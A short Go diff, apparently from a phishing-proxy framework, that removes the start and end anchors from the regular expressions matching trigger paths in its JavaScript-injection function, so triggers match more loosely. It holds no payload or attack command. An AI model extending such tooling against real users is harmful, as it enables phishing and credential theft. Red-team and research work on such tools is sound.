@@ -990,7 +990,7 @@ func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string,
 		js.trigger_domains = append(js.trigger_domains, strings.ToLower(d))
 	}
 	for _, d := range trigger_paths {
-		re, err := regexp.Compile("^" + d + "$")
+		re, err := regexp.Compile(d)
 		if err == nil {
 			js.trigger_paths = append(js.trigger_paths, re)
 		} else {
